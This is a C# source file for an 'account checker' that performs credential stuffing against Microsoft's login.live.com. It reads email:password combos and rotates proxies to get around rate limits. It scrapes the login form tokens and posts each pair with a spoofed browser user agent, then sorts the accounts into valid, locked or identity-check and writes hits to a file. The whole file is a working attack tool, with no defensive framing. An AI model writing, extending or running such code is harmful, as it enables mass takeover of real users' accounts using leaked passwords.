using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using AccountCheckerWPF.Models;

namespace AccountCheckerWPF.Services;

public class WorkerService
{
    private static ConcurrentQueue<string> AccCh = new ConcurrentQueue<string>();
    private static SemaphoreSlim Semaphore = new SemaphoreSlim(10);
    private static ConcurrentBag<Proxy> Proxies = new ConcurrentBag<Proxy>();
    private static int globalindex = 0;
    private static int retries = 0;
    private static int fails = 0;
    private static int hits = 0;
    private static int locked = 0;
    private static int indent = 0;

    public async Task WorkerFunc()
    {
        try
        {
            await Task.Run(async () =>
            {
                while (AccCh.TryDequeue(out string account))
                {
                    if (string.IsNullOrEmpty(account) || !account.Contains(":"))
                    {
                        break;
                    }

                    var acc = new Account { Combo = account };

                Retry:
                    var proxy = GetRandomProxy();
                    if (proxy == null)
                    {
                        goto Retry;
                    }

                    var httpClientHandler = new HttpClientHandler
                    {
                        Proxy = new WebProxy(proxy.Address),
                        UseProxy = true,
                    };

                    using (var client = new HttpClient(httpClientHandler))
                    {
                        client.Timeout = TimeSpan.FromSeconds(10);
                        var email = account.Split(':')[0];
                        var password = account.Split(':')[1];

                        try
                        {
                            var getResponse = await client.GetAsync("https://login.live.com/");
                            var bodyGet = await getResponse.Content.ReadAsStringAsync();

                            var ppft = ExtractValue(bodyGet, "value=\"", "\" name=\"PPFT\"");
                            var uaid = ExtractValue(bodyGet, "uaid=", ";");
                            var bk = ExtractValue(bodyGet, "bk=", ";");

                            var contentPost = $"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}";
                            var contentBytes = new StringContent(contentPost, Encoding.UTF8, "application/x-www-form-urlencoded");

                            var request = new HttpRequestMessage(HttpMethod.Post, $"https://login.live.com/ppsecure/post.srf?contextid=1D5E296F123C1F04&opid=27BAE89BB8C035AF&bk={bk}&uaid={uaid}&pid=0")
                            {
                                Content = contentBytes
                            };

                            request.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("text/html"));
                            request.Headers.AcceptLanguage.Add(new StringWithQualityHeaderValue("en-US"));
                            request.Headers.AcceptLanguage.Add(new StringWithQualityHeaderValue("en"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36");

                            var postResponse = await client.SendAsync(request);
                            var body = await postResponse.Content.ReadAsStringAsync();

                            var cookies = postResponse.Headers.GetValues("Set-Cookie").ToList();

                            if (cookies.Any(c => c.Contains("WLSSC")) || cookies.Any(c => c.Contains("ANON")) || body.Contains("SigninName") || body.Contains("https://login.live.com/oauth20_desktop.srf?"))
                            {
                                Console.WriteLine($"[ ✔️ ] Valid Account: {account}");
                                hits++;
                                goto Complete;
                            }
                            else if (body.Contains("sign in too many times") || body.Contains("Too Many Requests"))
                            {
                                retries++;
                                goto Retry;
                            }
                            else if (body.Contains("identity/confirm") || body.Contains("Email/Confirm"))
                            {
                                indent++;
                                Directory.CreateDirectory("Hits");
                                await File.AppendAllTextAsync("Hits/identity.txt", $"{email}:{password}\n");
                                Console.WriteLine($"[Identity] Account: {account}");
                                goto Complete;
                            }
                            else if (body.Contains("https://account.live.com/recover") || body.Contains("https://account.live.com/Abuse"))
                            {
                                locked++;
                                goto Complete;
                            }
                            else
                            {
                                fails++;
                            }
                        }
                        catch
                        {
                            retries++;
                            goto Retry;
                        }
                    }
                Complete:
                    globalindex++;
                }
            });
        }
        finally
        {
            Semaphore.Release();
        }
    }

    private Proxy GetRandomProxy()
    {
        Proxy proxy = null;
        foreach (var p in Proxies)
        {
            if (!p.InUse)
            {
                proxy = p;
                proxy.InUse = true;
                break;
            }
        }
        return proxy;
    }

    private string ExtractValue(string source, string start, string end)
    {
        var startIndex = source.IndexOf(start, StringComparison.Ordinal);
        if (startIndex == -1) return string.Empty;
        startIndex += start.Length;
        var endIndex = source.IndexOf(end, startIndex, StringComparison.Ordinal);
        if (endIndex == -1) return string.Empty;
        return source.Substring(startIndex, endIndex - startIndex);
    }
}